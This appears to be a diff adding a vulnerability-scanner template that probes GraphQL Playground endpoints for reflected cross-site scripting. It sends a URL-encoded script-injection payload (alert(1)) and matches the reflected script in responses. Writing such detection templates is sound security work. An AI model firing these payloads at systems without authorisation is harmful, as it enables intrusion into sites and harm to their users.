@@ -1,0 +1,21 @@
+id: graphql-playground-xss
+
+info:
+  name: Graphql Playground XSS
+  author: glatisant
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/graphql/%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      - "{{BaseURL}}/apis/dashboards/v1/graphql/%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    redirect: false  
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
